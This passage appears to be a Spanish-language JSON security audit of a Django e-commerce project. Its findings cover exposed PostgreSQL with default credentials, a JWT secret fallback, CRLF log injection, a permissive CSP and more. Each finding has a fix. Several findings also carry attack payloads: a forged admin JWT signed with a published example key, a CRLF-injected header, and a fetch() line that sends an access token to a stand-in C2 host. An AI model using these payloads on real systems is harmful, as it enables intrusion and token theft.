+    "title": "Uso inseguro del servidor de desarrollo Django (runserver) en Dockerfile, compose y scripts",
+    "description": "En 'docker-compose.yml:27', 'backend/Dockerfile:20' y el script 'iniciar_servicios.sh:17', el comando de ejecucion del backend utiliza 'python manage.py runserver 0.0.0.0:8000'. La documentacion oficial de Django advierte enfaticamente que 'runserver' es unicamente para pruebas locales: no ha sido auditado para seguridad, carece de manejo de concurrencia eficiente y es vulnerable a ataques de denegacion de servicio por agotamiento de conexiones (Slowloris / SYN flood). Desplegar la aplicacion con este comando en produccion degrada la seguridad y estabilidad global.",
+    "root_cause": "Invocacion de manage.py runserver en imagenes y contenedores de despliegue (docker-compose.yml:27 y backend/Dockerfile:20).",
+    "intended_behavior": "Los contenedores de backend deben iniciar con un servidor WSGI/ASGI endurecido como Gunicorn o Uvicorn.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/Dockerfile",
+        "line": 20,
+        "scope": "CMD",
+        "description": "Se define el comando de arranque del contenedor con manage.py runserver."
+      },
+      {
+        "kind": "sink",
+        "file": "docker-compose.yml",
+        "line": 27,
+        "scope": "services.backend.command",
+        "description": "Se ejecuta runserver enlazado a 0.0.0.0:8000."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "docker-compose.yml",
+        "line": 27,
+        "description": "command: python manage.py runserver 0.0.0.0:8000 ejecuta el servidor de desarrollo."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "Despliegue del contenedor backend utilizando el archivo docker-compose o la imagen Dockerfile provista."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Atacante que realiza conexiones TCP lentas o multiples peticiones concurrentes para saturar el servidor.",
+      "payloads": [
+        "Envio de peticiones concurrentes mediante ab o wrk hacia el puerto 8000."
+      ],
+      "instructions": [
+        "1. Levantar el servicio con docker-compose up backend.",
+        "2. Enviar 50 conexiones HTTP simultaneas con paquetes incompletos.",
+        "3. Monitorear el tiempo de respuesta para usuarios legitimos."
+      ],
+      "observed_result": "El servidor de desarrollo monohilo/multiproc basico se bloquea o eleva su latencia a varios segundos."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Es la configuracion por defecto suministrada en el repositorio para arrancar los servicios."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Denegacion de servicio y exposicion de informacion interna en caso de fallos no controlados."
+      },
+      "overall_severity": "medium"
+    },
+    "remediation": {
+      "strategy": "Instalar gunicorn en requirements.txt y modificar el CMD de Dockerfile y compose para ejecutar 'gunicorn config.wsgi:application --bind 0.0.0.0:8000 --workers 4'.",
+      "code_changes": [
+        {
+          "file_name": "backend/Dockerfile",
+          "fixed_code": "CMD [\"gunicorn\", \"config.wsgi:application\", \"--bind\", \"0.0.0.0:8000\", \"--workers\", \"4\"]"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "infra.docker.postgres-exposed-public-port",
+    "title": "Exposicion publica de puerto PostgreSQL (5432) con credenciales por defecto en docker-compose",
+    "description": "En el archivo de orquestacion 'docker-compose.yml', el servicio de base de datos 'db' publica directamente el puerto de PostgreSQL al host mediante la directiva 'ports: - \"5432:5432\"' sin vincularlo exclusivamente a la interfaz loopback (127.0.0.1). Adicionalmente, las variables de entorno configuran credenciales triviales ('POSTGRES_USER: postgres' y 'POSTGRES_PASSWORD: postgres'). Si el contenedor se levanta en un servidor con direccion IP publica o en una red compartida, el motor de base de datos queda expuesto a escaneos y conexiones externas de cualquier atacante sin restricciones de firewall.",
+    "root_cause": "Mapeo de puertos sin restriccion de interfaz y credenciales por defecto en docker-compose.yml:5-10.",
+    "intended_behavior": "Los servicios de base de datos dentro de Docker no deben exponer puertos al host externo, o deben enlazarse estrictamente a 127.0.0.1.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "docker-compose.yml",
+        "line": 5,
+        "scope": "services.db",
+        "description": "Definicion del contenedor PostgreSQL con credenciales postgres/postgres."
+      },
+      {
+        "kind": "sink",
+        "file": "docker-compose.yml",
+        "line": 9,
+        "scope": "services.db.ports",
+        "description": "Se publica 5432:5432 en 0.0.0.0 exponiendo el servicio hacia todas las interfaces de red."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "docker-compose.yml",
+        "line": 9,
+        "description": "ports: - \"5432:5432\" publica el puerto en 0.0.0.0:5432."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "network_routing",
+        "description": "Servidor ejecutando docker compose en una maquina accesible desde red local o direccion IP publica."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Atacante en la misma red o en internet escaneando puertos abiertos de PostgreSQL.",
+      "payloads": [
+        "psql -h <ip-host> -U postgres -d ecommerce_db"
+      ],
+      "instructions": [
+        "1. Levantar servicios con docker compose up.",
+        "2. Desde un host externo en la misma red, ejecutar 'nc -zv <host-ip> 5432' o conectarse con cliente psql.",
+        "3. Ingresar contrasena 'postgres'."
+      ],
+      "observed_result": "Conexion exitosa con privilegios de superusuario a la base de datos relacional de la aplicacion."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Escaneos masivos en internet descubren puertos 5432 expuestos en cuestion de minutos."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Acceso de lectura y escritura irrestricto a la base de datos, robo de contrasenas, PII y borrado de tablas."
+      },
+      "overall_severity": "high"
+    },
+    "remediation": {
+      "strategy": "Eliminar la directiva 'ports' del servicio 'db' en docker-compose.yml, permitiendo que solo los contenedores de la red interna se comuniquen con la base de datos, o utilizar '127.0.0.1:5432:5432'.",
+      "code_changes": [
+        {
+          "file_name": "docker-compose.yml",
+          "fixed_code": "  db:\n    image: postgres:15-alpine\n    ports:\n      - \"127.0.0.1:5432:5432\""
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "infra.docker.root-container-execution",
+    "title": "Ejecucion de contenedores Docker bajo el usuario root sin principio de menor privilegio",
+    "description": "Tanto 'backend/Dockerfile' como 'frontend/Dockerfile' construyen e inician sus procesos principales utilizando el usuario predeterminado 'root' (UID 0), al no declarar ninguna directiva 'USER' no privilegiada. En caso de una vulnerabilidad de escape de contenedor o una ejecucion remota de codigo en alguna dependencia de Python o Node, el atacante obtendra privilegios maximos en el espacio de nombres del contenedor, facilitando el acceso a recursos del host del sistema operativo.",
+    "root_cause": "Falta de directiva USER no privilegiada en backend/Dockerfile y frontend/Dockerfile.",
+    "intended_behavior": "Los contenedores deben ejecutarse bajo un usuario sin privilegios administrativos (ej. 'appuser' con UID/GID 1000).",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/Dockerfile",
+        "line": 1,
+        "scope": "FROM python:3.12-slim",
+        "description": "Se inicia la imagen base de Python ejecutando por defecto como root."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/Dockerfile",
+        "line": 20,
+        "scope": "CMD",
+        "description": "El comando de arranque se ejecuta con UID 0 (root)."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/Dockerfile",
+        "line": 20,
+        "description": "Dockerfile carece de instruccion USER previa a la definicion de CMD."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "Contenedor iniciado con docker run o docker-compose sin parametro --user."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Atacante que compromete un proceso dentro del contenedor y consulta sus privilegios de usuario.",
+      "payloads": [
+        "id"
+      ],
+      "instructions": [
+        "1. Iniciar el contenedor backend con docker-compose up.",
+        "2. Ejecutar 'docker exec -it <container_id> id'."
+      ],
+      "observed_result": "uid=0(root) gid=0(root) groups=0(root)."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Requiere un exploit previo de ejecucion de codigo en el contenedor para aprovechar los privilegios de root."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Aumenta la superficie de ataque y el riesgo de escape hacia el host anfitrion."
+      },
+      "overall_severity": "low"
+    },
+    "remediation": {
+      "strategy": "Crear un usuario y grupo sin privilegios en el Dockerfile y establecer 'USER appuser' antes de la instruccion CMD.",
+      "code_changes": [
+        {
+          "file_name": "backend/Dockerfile",
+          "fixed_code": "RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app\nUSER appuser"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "infra.env.hardcoded-jwt-secret-fallback",
+    "title": "Claves criptograficas publicas en plantillas .env y fallback inseguro de JWT_SECRET_KEY",
+    "description": "En el archivo de configuracion 'backend/config/settings.py:205', la variable 'JWT_SECRET_KEY' se define como 'os.getenv(\"JWT_SECRET_KEY\", SECRET_KEY)'. Si no se define una clave independiente para JWT, se utiliza la clave 'SECRET_KEY'. En el archivo '.env.example', ambas claves estan publicadas con valores de prueba predecibles ('django-insecure-...' y 'jwt-super-secret-key-...'). Si un administrador o desarrollador despliega la aplicacion copiando '.env.example' o no configura una clave JWT dedicada y robusta, un atacante puede firmar sus propios tokens JWT con cualquier identidad (incluyendo administradores) de forma arbitraria e indetectable.",
+    "root_cause": "Fallback de clave JWT a SECRET_KEY y presencia de claves de ejemplo conocidas (backend/config/settings.py:205 y .env.example:29,74).",
+    "intended_behavior": "La aplicacion debe rechazar el arranque si JWT_SECRET_KEY no esta configurada explicitamente en el entorno o si utiliza claves de ejemplo inseguras.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": ".env.example",
+        "line": 74,
+        "scope": "JWT_SECRET_KEY",
+        "description": "Se documenta una clave estatica y publica para la firma de tokens JWT."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/config/settings.py",
+        "line": 205,
+        "scope": "JWT_SECRET_KEY",
+        "description": "settings.py utiliza fallback os.getenv('JWT_SECRET_KEY', SECRET_KEY) sin validar entropia minima."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/accounts/authentication.py",
+        "line": 42,
+        "scope": "jwt.decode",
+        "description": "Se verifican firmas criptograficas con una clave potencialmente conocida o por defecto."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/config/settings.py",
+        "line": 205,
+        "description": "JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY', SECRET_KEY) permite que ambas claves compartan el mismo secreto."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "Despliegue donde no se sobrescribio JWT_SECRET_KEY con un valor aleatorio de alta entropia."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Atacante que genera un token JWT forjado utilizando la clave secreta predecible de .env.example.",
+      "payloads": [
+        "Token firmado con algoritmo HS256 y secreto 'jwt-super-secret-key-change-in-production-2026'"
+      ],
+      "instructions": [
+        "1. Forjar un token JWT con payload: {'user_id': 1, 'email': 'admin@inacap.cl', 'role': 'ADMIN', 'exp': 1893456000}.",
+        "2. Firmar el payload usando la clave predeterminada de .env.example.",
+        "3. Enviar solicitud GET a /api/v1/auth/me/ con la cabecera Authorization: Bearer <token_forjado>."
+      ],
+      "observed_result": "JWTAuthentication valida la firma HMAC y autentica la peticion como administrador."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "El uso de archivos .env.example sin modificacion de claves es un error comun de despliegue."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Falsificacion arbitraria de tokens de autenticacion y usurpacion de identidad completa."
+      },
+      "overall_severity": "high"
+    },
+    "remediation": {
+      "strategy": "Hacer obligatorio JWT_SECRET_KEY en settings.py sin fallback silencioso, y verificar en django.core.checks que no coincida con claves inseguras conocidas.",
+      "code_changes": [
+        {
+          "file_name": "backend/config/settings.py",
+          "fixed_code": "JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY')\nif not JWT_SECRET_KEY:\n    if DEBUG:\n        JWT_SECRET_KEY = SECRET_KEY\n    else:\n        raise ImproperlyConfigured('JWT_SECRET_KEY debe estar configurada en el entorno de produccion')"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "infra.scripts.indiscriminate-process-termination",
+    "title": "Terminacion indiscriminada de procesos del sistema operativo en scripts de parada",
+    "description": "En los scripts 'detener_servicios.sh:16-17' y 'detener_servicios.bat:9', las instrucciones de finalizacion de servicios ejecutan comandos violentos como 'fuser -k 5432/tcp', 'fuser -k 8000/tcp' o 'taskkill /F /PID'. Esto termina forzosamente cualquier proceso que este escuchando en el puerto 5432 en la maquina host, afectando a bases de datos PostgreSQL independientes que no pertenecen al proyecto, pudiendo causar corrupcion de tablas en bases de datos compartidas de otros proyectos de la organizacion.",
+    "root_cause": "Uso de fuser -k y taskkill /F sobre puertos globales en lugar de gestionar PIDs especificos (detener_servicios.sh:16-17).",
+    "intended_behavior": "Los scripts de control deben detener unicamente los procesos registrados en archivos PID especificos o mediante 'docker compose down'.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "detener_servicios.sh",
+        "line": 1,
+        "scope": "detener_servicios.sh",
+        "description": "Se inicia la ejecucion del script de parada de la aplicacion."
+      },
+      {
+        "kind": "sink",
+        "file": "detener_servicios.sh",
+        "line": 16,
+        "scope": "fuser -k",
+        "description": "Se termina indiscriminadamente cualquier proceso en el puerto 5432 mediante senal SIGKILL."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "detener_servicios.sh",
+        "line": 16,
+        "description": "fuser -k 5432/tcp mata todos los procesos en dicho puerto sin validar nombre de aplicacion."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "environmental_dependency",
+        "description": "Servidor de desarrollo o pruebas que aloja multiples bases de datos PostgreSQL o instancias en el mismo host."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Operador o desarrollador que ejecuta el script de parada tras una sesion de trabajo.",
+      "payloads": [
+        "./detener_servicios.sh"
+      ],
+      "instructions": [
+        "1. Iniciar un servicio legitimo de PostgreSQL ajeno en el host en el puerto 5432.",
+        "2. Ejecutar ./detener_servicios.sh.",
+        "3. Verificar el estado del servicio ajeno."
+      ],
+      "observed_result": "El proceso ajeno es terminado abruptamente con SIGKILL sin permitir guardado seguro de transacciones."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Ocurre unicamente durante la ejecucion local de scripts de parada en hosts compartidos."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Interrupcion de servicios concurrentes y riesgo de recuperacion en bases de datos adyacentes."
+      },
+      "overall_severity": "low"
+    },
+    "remediation": {
+      "strategy": "Utilizar 'docker compose stop' o registrar PIDs locales en archivos temporales para matar solo los procesos correspondientes.",
+      "code_changes": [
+        {
+          "file_name": "detener_servicios.sh",
+          "fixed_code": "docker compose stop db backend frontend\n# Evitar matar procesos del host indiscriminadamente"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "logging.middleware.crlf-log-injection-audit-spoofing",
+    "title": "Inyeccion de registros (Log Injection / CRLF) en middleware de auditoria de seguridad",
+    "description": "En SecurityAuditLoggingMiddleware la direccion IP del cliente se extrae directamente de la cabecera HTTP_X_FORWARDED_FOR y se concatena en el string formateado del logger sin sanitizar caracteres de control ni saltos de linea (\\r, \\n). Un atacante puede suministrar una cabecera X-Forwarded-For manipulada con saltos de linea para inyectar entradas falsas de auditoria (spoofed audit logs), simulando accesos legitimos de administradores o enmascarando actividades maliciosas.",
+    "root_cause": "Interpolacion no sanitizada de request.META[\"HTTP_X_FORWARDED_FOR\"] en logger.info dentro de SecurityAuditLoggingMiddleware (apps/security/middleware.py:46-50).",
+    "intended_behavior": "La direccion IP debe extraerse de REMOTE_ADDR confiable o sanitizarse rigurosamente eliminando cualquier caracter no correspondiente a direcciones IPv4/IPv6 validas.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/security/middleware.py",
+        "line": 46,
+        "scope": "SecurityAuditLoggingMiddleware.__call__",
+        "description": "La peticion HTTP incluye una cabecera X-Forwarded-For con caracteres CRLF y texto inyectado."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/security/middleware.py",
+        "line": 46,
+        "scope": "SecurityAuditLoggingMiddleware.__call__",
+        "description": "ip toma el valor crudo de HTTP_X_FORWARDED_FOR sin depuracion."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/security/middleware.py",
+        "line": 47,
+        "scope": "SecurityAuditLoggingMiddleware.__call__",
+        "description": "logger.info escribe el mensaje dividiendo la salida en multiples lineas de log falsificadas."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/security/middleware.py",
+        "line": 46,
+        "description": "ip = request.META.get(\"HTTP_X_FORWARDED_FOR\", request.META.get(\"REMOTE_ADDR\", \"Unknown\"))"
+      },
+      {
+        "file": "backend/apps/security/middleware.py",
+        "line": 47,
+        "description": "logger.info(f\"[AUDIT] Method: {request.method} | ... | IP: {ip} ...\")"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "network_routing",
+        "description": "El backend procesa la cabecera HTTP X-Forwarded-For enviada por el cliente."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Un atacante envia peticiones con X-Forwarded-For que contienen saltos de linea para generar registros falsos de inicio de sesion o borrar el rastro de su IP real en el registro de auditoria.",
+      "payloads": [
+        "X-Forwarded-For: 190.22.10.5\\r\\n[AUDIT] Method: POST | Path: /api/v1/auth/login/ | Status: 200 | User: admin@inacap.cl | IP: 127.0.0.1 | Time: 0.001s"
+      ],
+      "instructions": [
+        "1. Enviar una peticion HTTP con la cabecera X-Forwarded-For conteniendo \\n[AUDIT]...",
+        "2. Inspeccionar la salida del logger de seguridad.",
+        "3. Observar la creacion de una nueva linea en el log simulando un evento de auditoria legitimo."
+      ],
+      "observed_result": "El logger registra dos lineas independientes, permitiendo falsificar eventos de auditoria ISO 27001."
+    },
+    "remediation": {
+      "strategy": "Sanitizar la variable ip antes de registrarla en el log, permitiendo unicamente caracteres validos de direcciones IP ([0-9a-fA-F.:, ]).",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/security/middleware.py",
+          "fixed_code": "raw_ip = request.META.get(\"HTTP_X_FORWARDED_FOR\", request.META.get(\"REMOTE_ADDR\", \"Unknown\"))\nip = re.sub(r\"[^0-9a-fA-F.:, ]\", \"\", raw_ip.split(\",\")[0].strip())"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Cualquier cliente puede enviar cabeceras HTTP X-Forwarded-For manipuladas."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Corrupcion de registros de auditoria sin ejecucion remota de codigo."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Comprobado experimentalmente en el interprete de logging de Python."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "payments.cart.unhandled-value-error-dos",
+    "title": "Excepcion no controlada ValueError / DoS en calculo de carrito e inicializacion de pago",
+    "description": "En calculate_safe_cart_totals() el procesamiento de los items realiza la operacion int(item.get(\"quantity\", 1)) sin proteccion contra excepciones ValueError o TypeError. Las vistas CartCalculateAPIView y TransbankInitAPIView capturan unicamente ValidationError. Al enviar una cantidad con formato no numerico (por ejemplo \"abc\" o valores no convertibles), el servidor produce un error 500 no controlado por cada llamada.",
+    "root_cause": "Llamada no protegida a int(item.get(\"quantity\", 1)) en calculate_safe_cart_totals (apps/payments/services.py:33) y captura incompleta de excepciones en CartCalculateAPIView y TransbankInitAPIView.",
+    "intended_behavior": "El servicio debe validar el tipo y valor de quantity retornando ValidationError con HTTP 400 descriptivo ante cualquier valor no numerico o malformado.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/payments/views.py",
+        "line": 18,
+        "scope": "CartCalculateAPIView.post",
+        "description": "Se recibe una solicitud POST en /api/v1/payments/cart/calculate/ con quantity: \"invalid\"."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/payments/services.py",
+        "line": 33,
+        "scope": "calculate_safe_cart_totals",
+        "description": "int(item.get(\"quantity\", 1)) lanza ValueError: invalid literal for int() with base 10."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/payments/views.py",
+        "line": 45,
+        "scope": "CartCalculateAPIView.post",
+        "description": "La vista solo captura ValidationError; ValueError escala al custom_exception_handler devolviendo error 500."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/payments/services.py",
+        "line": 33,
+        "description": "qty = int(item.get(\"quantity\", 1)) ejecutado fuera de un bloque try...except ValueError."
+      },
+      {
+        "file": "backend/apps/payments/views.py",
+        "line": 45,
+        "description": "except ValidationError as e: solo maneja errores de validacion del modelo, ignorando ValueError."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "Cualquier usuario envia una solicitud HTTP POST con payload JSON malformado."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Un atacante envia peticiones con valores no numericos para generar errores 500 continuos en el servidor.",
+      "payloads": [
+        "{\"items\": [{\"product_id\": \"00000000-0000-0000-0000-000000000000\", \"quantity\": \"invalid\"}]}"
+      ],
+      "instructions": [
+        "1. Enviar POST /api/v1/payments/cart/calculate/ con {\"items\": [{\"product_id\": \"...\", \"quantity\": \"error\"}]}.",
+        "2. Observar respuesta HTTP 500 INTERNAL_SECURITY_ERROR.",
+        "3. Repetir en /api/v1/payments/transbank/init/ con el mismo resultado."
+      ],
+      "observed_result": "El backend devuelve HTTP 500 INTERNAL_SECURITY_ERROR ante datos de entrada invalidos en lugar de un error 400 controlado."
+    },
+    "remediation": {
+      "strategy": "Validar la conversion a entero con un bloque try...except (ValueError, TypeError) y lanzar ValidationError(\"La cantidad debe ser un numero entero positivo.\").",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/payments/services.py",
+          "fixed_code": "try:\n    qty = int(item.get(\"quantity\", 1))\nexcept (ValueError, TypeError):\n    raise ValidationError(\"La cantidad del producto debe ser un numero entero valido.\")"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "El endpoint es publico y no requiere autenticacion."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Provoca respuestas 500 no controladas y ruido en logs pero sin corrupcion de base de datos."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Verificado mediante ejecucion directa en consola Python."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "security.middleware.csp-wildcard-data-exfiltration",
+    "title": "Politica CSP permisiva con comodin https: permite exfiltracion global de datos sensibles",
+    "description": "En 'backend/apps/security/middleware.py:22-30', el middleware 'ISO27001SecurityHeadersMiddleware' construye la directiva Content-Security-Policy (CSP) incluyendo 'connect-src' e 'img-src' con el comodin 'https:'. En caso de que se produzca una vulnerabilidad XSS o una inyeccion en una libreria de terceros en el frontend, el navegador permitira realizar solicitudes HTTP de red ('fetch', 'XMLHttpRequest', 'sendBeacon') y cargar recursos hacia cualquier servidor externo en internet que opere sobre HTTPS. Esto anula la capacidad del CSP de contener la exfiltracion de tokens de autenticacion, credenciales y datos de tarjetas.",
+    "root_cause": "Uso de 'https:' como comodin en directivas connect-src e img-src de la cabecera CSP (backend/apps/security/middleware.py:25-27).",
+    "intended_behavior": "La directiva CSP connect-src debe restringir las conexiones salientes exclusivamente a 'self' y a las APIs especificas autorizadas (ej. transbank.cl).",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/security/middleware.py",
+        "line": 13,
+        "scope": "ISO27001SecurityHeadersMiddleware.__call__",
+        "description": "Se intercepta la respuesta HTTP para inyectar cabeceras de seguridad."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/security/middleware.py",
+        "line": 26,
+        "scope": "ISO27001SecurityHeadersMiddleware.__call__",
+        "description": "Se establece connect-src 'self' https: permitiendo llamadas de red hacia cualquier host HTTPS del mundo."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/security/middleware.py",
+        "line": 26,
+        "description": "\"connect-src 'self' http://localhost:* ws://localhost:* https:;\" incluye comodin https:."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "Respuesta HTTP servida por la aplicacion backend a traves del middleware de seguridad."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Script malicioso o dependencia comprometida intentando enviar datos a un servidor de comando y control (C2).",
+      "payloads": [
+        "fetch('https://c2-servidor-atacante.com/exfiltrate?token=' + localStorage.getItem('access_token'))"
+      ],
+      "instructions": [
+        "1. Obtener las cabeceras HTTP de una peticion hacia la API.",
+        "2. Inspeccionar la cabecera Content-Security-Policy retornada.",
+        "3. Verificar directiva connect-src en la consola de herramientas de desarrollo del navegador."
+      ],
+      "observed_result": "El navegador permite solicitudes fetch hacia cualquier dominio HTTPS externo debido al comodin https:."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "La politica permisiva esta activa de forma predeterminada en todas las respuestas del backend."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Facilita la exfiltracion no autorizada de datos y comunicacion con infraestructura atacante."
+      },
+      "overall_severity": "medium"
+    },
+    "remediation": {
+      "strategy": "Remover el comodin 'https:' de connect-src e img-src, declarando unicamente los dominios estrictamente necesarios.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/security/middleware.py",
+          "fixed_code": "\"connect-src 'self' https://webpay3gint.transbank.cl https://webpay3g.transbank.cl;\""
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "security.middleware.missing-hsts-permissions-policy-conflict",
+    "title": "Ausencia de cabecera HSTS y conflicto en Permissions-Policy con geolocalizacion",
+    "description": "En 'backend/apps/security/middleware.py:16-21', el middleware inyecta cabeceras de seguridad como X-Frame-Options y Content-Security-Policy, pero omite la cabecera 'Strict-Transport-Security' (HSTS), permitiendo ataques de degradacion SSL/TLS (SSL-stripping). Asimismo, la directiva 'Permissions-Policy' define 'geolocation=()' (bloqueo total de geolocalizacion), a pesar de que la aplicacion incluye modulos de mapas y despacho de barrio que requieren ubicacion para calcular rutas de entrega.",
+    "root_cause": "Omision de Strict-Transport-Security y regla restrictiva en Permissions-Policy (backend/apps/security/middleware.py:16-21).",
+    "intended_behavior": "El middleware debe incluir cabecera HSTS en conexiones seguras y permitir geolocalizacion exclusivamente al origen 'self'.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/security/middleware.py",
+        "line": 13,
+        "scope": "ISO27001SecurityHeadersMiddleware.__call__",
+        "description": "Se reciben peticiones HTTP para inyectar politicas de cabeceras de respuesta."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/security/middleware.py",
+        "line": 20,
+        "scope": "ISO27001SecurityHeadersMiddleware.__call__",
+        "description": "Se establece Permissions-Policy sin configurar Strict-Transport-Security."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/security/middleware.py",
+        "line": 19,
+        "description": "response['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()' sin presencia de Strict-Transport-Security."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "network_routing",
+        "description": "Conexion de cliente a traves de redes intermedias no confiables (Wi-Fi publico)."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Atacante Man-in-the-Middle que intercepta peticiones HTTP iniciales para impedir el paso a HTTPS.",
+      "payloads": [
+        "Peticion inicial HTTP sin HSTS preconfigurado."
+      ],
+      "instructions": [
+        "1. Enviar una peticion curl -I http://localhost:8000/api/v1/products/.",
+        "2. Revisar si la respuesta contiene Strict-Transport-Security."
+      ],
+      "observed_result": "La respuesta carece de Strict-Transport-Security, posibilitando ataques de degradacion a texto plano."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "HSTS suele ser suplementado por terminadores TLS y balanceadores perimetrales (Nginx/Cloudflare)."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Riesgo de intercepcion de credenciales en redes no seguras si el proxy no inyecta la cabecera."
+      },
+      "overall_severity": "low"
+    },
+    "remediation": {
+      "strategy": "Inyectar Strict-Transport-Security cuando la peticion sea HTTPS y ajustar geolocation a 'self'.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/security/middleware.py",
+          "fixed_code": "if request.is_secure():\n    response['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'\nresponse['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=(self)'"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "settings.database.silent-sqlite-fallback-data-leakage",
+    "title": "Conmutacion silenciosa a base de datos SQLite local si PostgreSQL no responde en el arranque",
